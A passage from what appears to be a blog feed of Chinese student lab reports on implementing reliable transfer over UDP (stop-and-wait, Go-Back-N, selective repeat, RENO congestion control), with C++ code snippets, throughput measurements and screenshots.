height="80%"></p><p>解决方法可以是增大判断超时的时间。但是很明显，这会增加传输时间，而且这也并没有解决根本问题，并且会使正常情形下丢包的代价增加。</p><p>因此我们看到，由于发送和接收速率相差太大，“流量控制”也没能控制住。只好强行压制发送端的速度，查看在接收和发送基本对等的情况下滑动窗口的表现：</p><p>具体做法是在发送每一个while循环手动添加延时，模拟上层交付流较缓慢的情况：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-9nwvatlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-9nwvatlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">// wait for a while to send next packet (simulating content processing)</span><span class="hljs-comment">// this is to avoid sending too many packets at once</span><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">10</span>);</code></pre></div></div><p>这时SR算法顺畅的进行了接收：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205759168631_535_20221230235954811850_358_image-20221230222352630.png" alt="image-20221230222352630" width="67%" height="67%"></p><p>在添加发送延时后，控制变量（延迟和丢包率分别为0ms和1%）并测量吞吐率：</p><table><thead><tr class="header"><th>窗口大小</th><th>2</th><th>10</th><th>40</th></tr></thead><tbody><tr class="odd"><td>停等</td><td>65120</td><td>65120</td><td>65120</td></tr><tr class="even"><td>GBN</td><td>46008</td><td>46335</td><td>49433</td></tr><tr class="odd"><td>SR</td><td>39249</td><td>40451</td><td>48574</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205800197076_765_20221230235956046493_674_image-20221230231420543.png" alt="image-20221230231420543" width="80%" height="80%"></p><p>可以看到，此时滑动窗口发挥了其应有的作用。</p><h3 id="拥塞控制性能探索">拥塞控制性能探索</h3><p>在实验3.3中提到，在GBN上实现RENO算法可以不改变发送端（累积确认，不缓存），但这样带来的问题是这种情况下快速重传当前期望的包只是解决了“眼前的问题”，其余的包迟早还要超时重传，因此尽管进⾏了拥塞控制，但重传的⾏为在实际⽹络环境中事实上加剧了拥塞。因此对接收端进行了改进，使其在保持累积确认的基础上对包进行缓存。（详细可参见<a href="https://lunaticsky-tql.github.io/posts/55889/">lab3.3</a>）</p><p>下面以窗口大小为10，延迟和丢包率分别为0ms和1%为例，对各算法性能进行对比：</p><table><thead><tr class="header"><th>停等</th><th>GBN</th><th>SR</th><th>RENO-no-cache</th><th>RENO-cached</th></tr></thead><tbody><tr class="odd"><td>65120</td><td>46335</td><td>40451</td><td>50843</td><td>25224</td></tr></tbody></table><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205801106054_539_20221230235956891555_921_image-20221230233213265.png" alt="image-20221230233213265"><figcaption aria-hidden="true">image-20221230233213265</figcaption></figure><p>可以看到缓存的RENO-cached算法性能最好，因为其在实验环境下完全避免了重传，使接收端的负担最小。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205802237991_691_20221230235958223014_915_image-20221230233838694.png" alt="image-20221230233838694" width="50%" height="50%"></p><p>（在真实环境下大部分情况一次丢一个包的前提下也能取得很好的表现，如果一次丢多个包，可以考虑NewRENO，如果希望更细致的预测网络环境，Cubic等算法还可以做的更好）</p><h2 id="总结">总结</h2><p>这学期的计算机网络作业层层相扣，并且有效的将理论与实践相结合。通过这几次实验，我不再停留在机械的记忆TCP各个过程的细节，而是贯通性的理解了一个可靠数据传输协议设计的过程，以及如何去应对一些特殊情况或进行优化。当然，像TCP这样复杂的协议设计远非我们简单通过几个实验能够完全理解透彻的，就比如拥塞控制算法就有很多优化的方向，在本系列实验中也没能深入探究。</p><p>这次实验采用git进行管理，虽然说还不甚规范，但也让我更加熟悉了git的工作流，为以后进行更大项目的开发做准备。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205803263913_266_20221231000000050866_774_image-20221230234222414.png" alt="image-20221230234222414" width="50%" height="50%"></p><h3 id="源代码">源代码</h3><p><a href="https://github.com/Lunaticsky-tql/rdt_on_udp">github</a></p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.3-基于UDP服务设计可靠传输协议(拥塞控制)</title>
    <link href="/posts/55889/"/>
    <url>/posts/55889/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.3-基于udp服务设计可靠传输协议拥塞控制">计算机网络实验3.3-基于UDP服务设计可靠传输协议(拥塞控制)</h1><h2 id="实验要求">实验要求</h2><ul><li>在实验3-2的基础上，选择实现一种拥塞控制算法，也可以是改进的算法，完成给定测试文件的传输。</li><li>RENO算法；</li><li>也可以自行设计协议或实现其他拥塞控制算法；</li><li>给出实现的拥塞控制算法的原理说明；</li><li>有必要日志输出（须显示窗口大小改变情况）。</li></ul><h2 id="程序流程展示">程序流程展示</h2><p>注：与实验3.1相同的部分仅作简要叙述，详细可以参见<a href="https://lunaticsky-tql.github.io/posts/24837/">计算机网络实验实验3.1</a></p><h3 id="协议设计">协议设计</h3><p>基于rdt3.0,本次实验在GBN的基础上实现了RENO拥塞控制算法，并通过令接收方缓存失序包验证了快速重传的正确性和有效性。</p><h4 id="报文结构">报文结构</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210349911222_209_20221230152034348306_831_image-20221210213415264.png" alt="image-20221210213415264"><figcaption aria-hidden="true">image-20221210213415264</figcaption></figure><p>如图所示，报文头长度共<code>128Bits</code>。下面介绍报文结构如下所示：</p><p>整个实验只使用一个序列号字段。对于发送端对应<code>TCP</code>中的<code>seq</code>,接收端对应<code>TCP</code>中的<code>ack</code>。</p><p>下面是十六位校验和以及数据报字段长度，与<code>TCP</code>相同。</p><p>使用<code>u_short</code>来存放<code>flag</code>。其字段含义如下：</p><p><code>F</code>:<code>FIN</code></p><p><code>S</code>:<code>SYN</code></p><p><code>A</code>:<code>ACK</code></p><p><code>H</code>:<code>FILE_HEAD</code></p><p><code>FILE_HEAD</code>用于指示接收端此报文包含文件信息的字段。</p><p><code>window_size</code>存放接收端通告给发送端的窗口大小。</p><p><code>option</code>为可选字段，在本次实验中暂时用于存放文件长度。</p><p><code>data</code>的最大长度可以调节，本次实验定义为1024字节。</p><p>此部分代码段的定义可参阅源代码或<code>3.1</code>部分的报告。</p><h4 id="建连和断连">建连和断连</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210351561005_344_20221230152036062959_629_image-20221119154308774.png" alt="image-20221119154308774"><figcaption aria-hidden="true">image-20221119154308774</figcaption></figure><p>建连和断连过程与3.1无太大变化。主要是在建连过程中增加了接收方初始窗口大小的通告。</p><h2 id="程序代码解释">程序代码解释</h2><h3 id="文件发送过程">文件发送过程</h3><h4 id="发送端">发送端</h4><p>在本次实验中发送端实现的是基础的RENO算法.状态机如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210353307221_304_20221230152038775603_907_image-20221230093102447.png" alt="image-20221230093102447"><figcaption aria-hidden="true">image-20221230093102447</figcaption></figure><p>下面将结合代码进行拥塞控制算法具体的原理及实现。</p><h5 id="发送分组">发送分组</h5><p>首先由于拥塞控制算法中窗口大小计算是以字节为单位的，因此本次实验中计算和展示窗口大小时也改为字节计数（而不是按分组计数），如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210355265155_315_20221230152040038538_334_image-20221230094338108.png" alt="image-20221230094338108" width="80%" height="80%"></p><p>在发送时，只需要添加“实际发送窗口取决于接收通告窗口和拥塞控制窗口中较小值”对应的代码即可，对应于第一行：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2rnpqylmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-2rnpqylmrh9u6a"><pre><code class="hljs C++"><span class="hljs-comment">//send packets</span>window_size = <span class="hljs-built_in">min</span>(cwnd, advertised_window_size);<span class="hljs-keyword">if</span> ((LastByteSent - LastByteAcked &lt; window_size) &amp;&amp; (LastByteSent &lt; file_len)) {    pkt_data_size = <span class="hljs-built_in">min</span>(MAX_SIZE, file_len - nextseqnum * MAX_SIZE);    sndpkts[nextseqnum] = <span class="hljs-built_in">make_pkt</span>(DATA, nextseqnum, pkt_data_size, file_data + nextseqnum * MAX_SIZE);    <span class="hljs-built_in">udt_send</span>(sndpkts[nextseqnum]);    cout &lt;&lt; <span class="hljs-string">"Sent packet "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum) + <span class="hljs-string">" "</span>;    <span class="hljs-keyword">if</span> (base == nextseqnum) {        timer.<span class="hljs-built_in">start_timer</span>();    }    nextseqnum++;    LastByteSent += pkt_data_size;    <span class="hljs-built_in">print_window</span>();}</code></pre></div></div><p>拥塞控制相关的逻辑主要在于接收ACK和超时时的窗口变化。下面将着重讲解。</p><h5 id="接收ack">接收ACK</h5><p>首先我们先来看处理正常收到ACK的情况：</p><p>上一个实验中提到，实际网络环境中<code>ACK</code>未必是按序到达的，因此将<code>base</code>的移动改为判断按照按序接收到ACK为标准进行滑动，如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-06hwbalmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-06hwbalmrh9u6a"><pre><code class="hljs C++"><span class="hljs-comment">//        base = get_ack_num(rcvpkt) + 1;</span>        acked[<span class="hljs-built_in">get_ack_num</span>(rcvpkt)] = <span class="hljs-literal">true</span>;        <span class="hljs-keyword">while</span> (acked[base]) {            base++;        }</code></pre></div></div><p>但是，实际上注意到，当接收方发出一个更大的ACK，说明之前的ACK事实上已经按序收到。当发送方收到一个更大的ACK时，不管之前的ACK有没有返回到发送方，发送方仅通过这个信息就已经可以确信接收方按序收到了之前的ACK了。因此其实是可以放心的进行<code>base = get_ack_num(rcvpkt) + 1</code>的。</p><p>之后，我们据此更新<code>LastByteAcked</code>，然后根据状态机对RENO算法的状态进行更新，最后更新窗口大小。据此，代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2yevjxlmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-2yevjxlmrh9u6a"><pre><code class="hljs C++">      u_int ack_num = <span class="hljs-built_in">get_ack_num</span>(rcvpkt);<span class="hljs-keyword">if</span> (ack_num &gt;= base) {          u_int gap = ack_num - base + <span class="hljs-number">1</span>;          <span class="hljs-comment">//update the base and LastByteAcked</span>          <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; gap; i++) {              LastByteAcked += sndpkts[base + i].head.data_size;          }          base = ack_num + <span class="hljs-number">1</span>;          <span class="hljs-keyword">switch</span> (RENO_STATE) {              <span class="hljs-keyword">case</span> SLOW_START:                  cwnd += gap * MSS;                  dupACKcount = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">if</span> (cwnd &gt;= ssthresh) {                      RENO_STATE = CONGESTION_AVOIDANCE;                  }                  <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">case</span> CONGESTION_AVOIDANCE:                  cwnd += gap * MSS * MSS / cwnd;                  dupACKcount = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">case</span> FAST_RECOVERY:                  cwnd = ssthresh;                  RENO_STATE = CONGESTION_AVOIDANCE;                  dupACKcount = <span class="hljs-number">0</span>;                  <span class="hljs-keyword">break</span>;              <span class="hljs-keyword">default</span>:                  <span class="hljs-keyword">break</span>;          }          window_size = <span class="hljs-built_in">min</span>(cwnd, advertised_window_size);      }</code></pre></div></div><p>处于慢启动阶段时，窗口大小增大1MSS。每过一个RTT，cwnd翻倍，窗口大小呈指数增长；而处于拥塞避阶段时，免<code>cwnd = cwnd + MSS*(MSS/cwnd)</code>。相当于每过一个RTT，cwnd加1。</p><p>当收到冗余ACK时，我们需要进行快速重传，并进行窗口大小更新。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-a3s00clmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-a3s00clmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">//duplicate ACK</span>dupACKcount++;<span class="hljs-keyword">if</span> (RENO_STATE == SLOW_START || RENO_STATE == CONGESTION_AVOIDANCE) {    <span class="hljs-keyword">if</span> (dupACKcount == <span class="hljs-number">3</span>) {        <span class="hljs-comment">//fast retransmit</span>        ssthresh = cwnd / <span class="hljs-number">2</span>;        cwnd = ssthresh + <span class="hljs-number">3</span> * MSS;        window_size = <span class="hljs-built_in">min</span>(cwnd, advertised_window_size);        RENO_STATE = FAST_RECOVERY;        <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Fast resend"</span>+<span class="hljs-built_in">to_string</span>(ack_num), WARNING);        <span class="hljs-comment">//resend the packet</span>        <span class="hljs-built_in">udt_send</span>(sndpkts[ack_num + <span class="hljs-number">1</span>]);    } <span class="hljs-keyword">else</span> {        cwnd += MSS;    }}</code></pre></div></div><h5 id="超时处理">超时处理</h5><p>注意到，不管什么状态下，超时后都需要恢复到慢启动状态，因此直接在超时事件上进行改动即可。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-frskdxlmrh9u6a"></i><span>C++</span><div class="collapse show" id="collapse-frskdxlmrh9u6a"><pre><code class="hljs C++"><span class="hljs-comment">//handle timeout</span><span class="hljs-keyword">if</span> (timer.<span class="hljs-built_in">timeout</span>()) {    <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Timeout, resend packets from "</span> + <span class="hljs-built_in">to_string</span>(base) + <span class="hljs-string">" to "</span> + <span class="hljs-built_in">to_string</span>(nextseqnum - <span class="hljs-number">1</span>),                  WARNING);    <span class="hljs-keyword">for</span> (u_int i = base; i &lt; nextseqnum; i++) {        <span class="hljs-built_in">udt_send</span>(sndpkts[i]);    }    ssthresh = cwnd / <span class="hljs-number">2</span>;    cwnd = MSS;    dupACKcount = <span class="hljs-number">0</span>;    RENO_STATE = SLOW_START;    timer.<span class="hljs-built_in">start_timer</span>();}</code></pre></div></div><h4 id="接收端">接收端</h4><p>首先我们可以运行查看接收端不进行改变的情况：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210357363668_598_20221230152041186332_251_image-20221230114950444.png" alt="image-20221230114950444"><figcaption aria-hidden="true">image-20221230114950444</figcaption></figure><p>可以看到，当接收方不缓存失序的包时，即使有了快速重传，由于之前发过的，对接收端来说失序的包没有进行缓存，仍旧相当于丢失了。因此快速重传当前期望的包只是解决了“眼前的问题”，其余的包迟早还要超时重传，因此尽管进行了拥塞控制，但重传的行为在实际网络环境中事实上加剧了拥塞。</p><p>因此基于此可以对接收端的逻辑进行改进：</p><p>在前面提到，接收端必须是累计确认的（确认按序收到的最大序号），发送端才有理由在移动窗口时移动到当前<code>ack+1</code>的位置。同时我们还想让接收端缓存失序的包，以避免发送端进行已收到的包的重传而加剧拥塞。</p><p>因此我在上一次实验的<code>SR</code>的基础上修改发送ACK行为，使其从选择确认转变成累计确认，同时保留其缓存失序包行为即可解决这个问题。代码如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rkgopalmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-rkgopalmrh9u6a"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (pkt_seq &gt;= rcv_base &amp;&amp; pkt_seq &lt;= rcv_base + N - <span class="hljs-number">1</span>) {     <span class="hljs-comment">//in the window</span>     <span class="hljs-keyword">if</span> (!acked[pkt_seq]) {         <span class="hljs-keyword">if</span> (pkt_seq == rcv_base) {             <span class="hljs-comment">//the first packet in the window</span>             pkt_data_size = rcvpkt.head.data_size;             <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);             acked[pkt_seq] = <span class="hljs-literal">true</span>;             <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq), DEBUG);             <span class="hljs-comment">//slide the window</span>             <span class="hljs-keyword">while</span> (acked[rcv_base]) {                 rcv_base++;             }             packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base - <span class="hljs-number">1</span>);             <span class="hljs-built_in">udt_send</span>(sndpkt);         } <span class="hljs-keyword">else</span> {             <span class="hljs-comment">//not the first packet in the window, cache it</span>             pkt_data_size = rcvpkt.head.data_size;             <span class="hljs-built_in">memcpy</span>(file_buffer + pkt_seq * MAX_SIZE, rcvpkt.data, pkt_data_size);             acked[pkt_seq] = <span class="hljs-literal">true</span>;             packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base - <span class="hljs-number">1</span>);             <span class="hljs-built_in">udt_send</span>(sndpkt);             <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">", cached"</span>, DEBUG);         }     } <span class="hljs-keyword">else</span> {         <span class="hljs-comment">//already acked in the window, do not resend ack</span>         <span class="hljs-built_in">print_message</span>(<span class="hljs-string">"Received packet "</span> + <span class="hljs-built_in">to_string</span>(pkt_seq) + <span class="hljs-string">" again"</span>, WARNING);           packet sndpkt = <span class="hljs-built_in">make_pkt</span>(ACK, rcv_base - <span class="hljs-number">1</span>);           <span class="hljs-built_in">udt_send</span>(sndpkt);     } }</code></pre></div></div><p>当收到窗口内的包时，总是发送当前<code>rcv_base - 1</code>位置的ACK。但是如果收到的包恰巧在<code>rcv_base</code>上，那么窗口其实有潜力往前移动很多，以覆盖之前缓存过的包。移动完了之后再发送<code>rcv_base - 1</code>位置的ACK，让发送端知道在这之前的包都已经按序收到了。除此之外的情况都不发送ACK。</p><p>可以看到，修改后快速恢复起到了其应有的作用。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210358596080_182_20221230152042406823_264_image-20221230150921352.png" alt="image-20221230150921352"><figcaption aria-hidden="true">image-20221230150921352</figcaption></figure><p>成功收取！</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210359833669_236_20221230152044466619_169_image-20221230151133854.png" alt="image-20221230151133854"><figcaption aria-hidden="true">image-20221230151133854</figcaption></figure><h2 id="程序演示">程序演示</h2><h3 id="建立连接">建立连接</h3><p>路由器设置：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210401042416_182_20221230152045800174_408_image-20221119185527966.png" alt="image-20221119185527966"><figcaption aria-hidden="true">image-20221119185527966</figcaption></figure><p>增大通告窗口大小，观察慢启动和拥塞控制阶段窗口大小变化。慢启动阶段，<code>cwnd</code>的值迅速增大，当<code>cwnd&gt;=ssthresh</code>后进入拥塞控制阶段，cwnd增速减缓。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.3-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6/20230828210402066095_776_20221230152046860766_341_image-20221230151606540.png" alt="image-20221230151606540"><figcaption aria-hidden="true">image-20221230151606540</figcaption></figure><p>快速重传的正确性上面分析的过程中也已经验证。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.2-基于UDP服务设计可靠传输协议(流量控制)</title>
    <link href="/posts/39007/"/>
    <url>/posts/39007/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.2-基于udp服务设计可靠传输协议流量控制">计算机网络实验3.2-基于UDP服务设计可靠传输协议(流量控制)</h1><div class="note note-info">写在前面：这次由于突然发烧隔离（虽然不是阳，也是挺重的一次感冒）导致没能及时检查作业，比较可惜。也借此提醒自己：一定要注意身体。另外也得接受教训。如金哥所言，提高应急处突能力还是非常重要的。</div><h2 id="实验要求">实验要求</h2><p>在实验3-1的基础上，将停等机制改成基于滑动窗口的流量控制机制，采用固定窗口大小，支持累积确认，完成给定测试文件的传输。</p><ul><li>多个序列号；</li><li>发送缓冲区、接受缓冲区；</li><li>滑动窗口：Go Back N；</li><li>有必要日志输出（须显示传输过程中发送端、接收端的窗口具体情况）。</li></ul><h2 id="程序流程展示">程序流程展示</h2><p>注：与实验3.1相同的部分仅作简要叙述，详细可以参见<a href="https://lunaticsky-tql.github.io/posts/24837/">计算机网络实验实验3.1</a></p><h3 id="协议设计">协议设计</h3><p>基于rdt3.0,本次实验实现了GBN和SR两种流水线协议，并采用多线程编程。</p><h4 id="报文结构">报文结构</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.2-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6/20230828210446856605_235_20221210213512464145_894_image-20221210213415264.png" alt="image-20221210213415264"><figcaption aria-hidden="true">image-20221210213415264</figcaption></figure><p>如图所示，报文头长度共<code>128Bits</code>。下面介绍报文结构如下所示：</p><p>整个实验只使用一个序列号字段。对于发送端对应<code>TCP</code>中的<code>seq</code>,接收端对应<code>TCP</code>中的<code>ack</code>。</p><p>下面是十六位校验和以及数据报字段长度，与<code>TCP</code>相同。</p><p>使用<code>u_short</code>来存放<code>flag</code>。其字段含义如下：</p><p><code>F</code>:<code>FIN</code></p><p><code>S</code>:<code>SYN</code></p><p><code>A</code>:<code>ACK</code></p><p><code>H</code>:<code>FILE_HEAD</code></p><p><code>FILE_HEAD</code>用于指示接收端此报文包含文件信息的字段。</p><p><code>window_size</code>存放接收端通告给发送端的窗口大小。</p><p><code>option</code>为可选字段，在本次实验中暂时用于存放文件长度。</p><p><code>data</code>的最大长度可以调节，本次实验定义为1024字节。</p><p>此部分定义代码段如下;</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-59qrtplmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-59qrtplmrh9u6a"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 1024</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA 0x0</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIN 0x1</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYN 0x2</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK 0x4</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_SYN 0x6</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> ACK_FIN 0x5</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_HEAD 0x8</span><span class="hljs-comment">// datagram format:</span><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> pack(1)</span><span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet_head</span> {    u_int seq;    u_short check_sum;    u_short data_size;    u_short flag;    u_short window_size;    u_int option;    <span class="hljs-built_in">packet_head</span>() {        seq = <span class="hljs-number">0</span>;        check_sum = <span class="hljs-number">0</span>;        data_size = <span class="hljs-number">0</span>;        flag = <span class="hljs-number">0</span>;        window_size = <span class="hljs-number">0</span>;        option = <span class="hljs-number">0</span>;    }};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">packet</span> {    packet_head head;    <span class="hljs-type">char</span> data[MAX_SIZE]{};    <span class="hljs-built_in">packet</span>() {        <span class="hljs-built_in">packet_head</span>();        <span 